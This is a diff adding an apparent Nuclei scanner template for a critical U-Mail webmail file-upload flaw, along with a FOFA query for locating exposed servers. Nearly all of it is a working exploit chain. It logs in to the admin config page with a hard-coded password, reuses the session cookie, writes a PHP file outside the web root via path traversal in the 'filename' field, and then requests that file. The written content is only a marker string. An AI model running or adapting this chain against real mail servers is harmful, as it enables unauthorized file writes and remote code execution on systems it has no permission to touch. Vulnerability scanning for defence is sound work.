@@ -1,0 +1,50 @@
+id: u-mail-file-upload
+
+info:
+  name: U-Mail File Upload
+  author: zp857
+  severity: critical
+  tags: umail,rce
+  metadata:
+    fofa-query: 'app="U-Mail"'
+
+requests:
+  - raw:
+      - |
+        POST /webmail/admin/iniconfig.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=login&password=mmglsmd%606561&go=%26%2325552%3B%26%2320132%3B
+
+      - |
+        POST /webmail/admin/iniconfig.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{cookie}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=save&filename=../WorldClient/html/zp857.php&file_content=zp857
+
+      - |
+        GET /webmail/zp857.php HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: cookie
+        group: 1
+        internal: true
+        part: header
+        regex:
+          - 'Set-Cookie: (.*?);'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "GatewayName"
+          - "zp857"
+
+      - type: status
+        status:
+          - 200
